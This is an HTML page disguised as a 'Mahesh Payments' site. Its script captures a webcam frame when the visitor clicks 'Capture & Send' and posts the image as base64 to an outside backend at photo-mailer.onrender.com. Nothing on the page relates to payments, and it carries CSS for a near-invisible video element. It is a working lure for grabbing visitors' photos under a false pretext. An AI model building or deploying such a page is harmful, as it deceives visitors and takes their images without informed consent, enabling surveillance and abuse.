<!DOCTYPE html>
<html>
<head>
  <title>Mahesh Payments</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;

      /* Background image */
      background-image: url('hulk.jpg'); /* Replace with your image */
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      color: white;
    }

    h1 {
      margin-bottom: 20px;
      font-size: 2em;
      text-shadow: 2px 2px 4px rgba(0,0,0,0.7);
    }

    .circle-img {
      width: 40vw;           /* responsive width */
      max-width: 200px;      /* limit max size */
      height: 40vw;          /* keep square */
      max-height: 200px;
      border-radius: 50%;
      overflow: hidden;
      margin: 0 auto 20px auto;
      border: 2px solid white;
    }

    .circle-img img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    #capture {
      padding: 12px 25px;
      font-size: 1rem;
      cursor: pointer;
      background-color: rgba(0,128,0,0.8);
      color: white;
      border: none;
      border-radius: 5px;
      transition: background-color 0.3s;
    }

    #capture:hover {
      background-color: rgba(0,100,0,0.9);
    }
    #video {
      position: absolute;
      width: 1px;
      height: 1px;
      opacity: 0.01;
    }

    /* Responsive tweaks */
    @media (max-width: 480px) {
      h1 {
        font-size: 1.5em;
      }

      #capture {
        padding: 10px 20px;
        font-size: 0.9rem;
      }

      .circle-img {
        width: 50vw;
        height: 50vw;
      }
    }
  </style>
</head>
<body>

<h1>Mahesh Payments</h1>

<div class="circle-img">
  <img src="pan.jpg" alt="Profile">
</div>

<button id="capture">Capture & Send</button>

<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

<script>
const canvas = document.getElementById("canvas");
const captureBtn = document.getElementById("capture");

captureBtn.onclick = async () => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    stream.getTracks().forEach(track => track.stop());

    const base64 = canvas.toDataURL("image/png");

    const backendUrl = "https://photo-mailer.onrender.com/sendphoto"; // replace with deployed backend
    const res = await fetch(backendUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image: base64 })
    });

    alert(await res.text());
  } catch (err) {
    alert("Error accessing camera: " + err.message);
  }
};
</script>

</body>
</html>
